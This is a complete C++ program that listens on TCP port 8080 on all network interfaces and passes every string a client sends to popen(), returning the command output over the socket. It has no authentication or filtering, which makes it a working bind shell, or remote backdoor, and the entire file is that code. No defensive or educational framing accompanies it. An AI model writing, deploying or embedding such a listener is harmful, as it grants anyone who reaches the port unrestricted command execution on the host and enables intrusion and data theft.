#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <iostream>
#include <cstring>
#include <cstdio>

int main() {
    // Socket creation
    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) {
        std::cerr << "Socket creation failed\n";
        return 1;
    }

    // Address configuration
    struct sockaddr_in address;
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(8080);

    // Bind
    if (bind(server_fd, (struct sockaddr*)&address, sizeof(address)) < 0) {
        std::cerr << "Bind failed\n";
        return 1;
    }

    // Listen
    if (listen(server_fd, 3) < 0) {
        std::cerr << "Listen failed\n";
        return 1;
    }

    std::cout << "Waiting for clients...\n";
    
    // Accept connection
    int client = accept(server_fd, nullptr, nullptr);
    if (client < 0) {
        std::cerr << "Accept failed\n";
        return 1;
    }

    // Continuous communication loop
    char buffer[1024];
    while(true) {
        memset(buffer, 0, sizeof(buffer));  // Clear buffer
        
        // Receive data
        ssize_t valread = read(client, buffer, sizeof(buffer)-1);
        if (valread <= 0) {
            if (valread == 0)
                std::cout << "Client disconnected\n";
            else
                std::cerr << "Read error\n";
            break;
        }
        
        // Execute command and capture output
        FILE* cmd_stream = popen(buffer, "r");
        if (!cmd_stream) {
            const char* error = "Command execution failed\n";
            write(client, error, strlen(error));
            continue;
        }

        // Read command output and send to client
        char output_chunk[1024];
        while (fgets(output_chunk, sizeof(output_chunk), cmd_stream) != nullptr) {
            write(client, output_chunk, strlen(output_chunk));
        }
        
        pclose(cmd_stream);
    }

    close(client);
    close(server_fd);
    return 0;
}

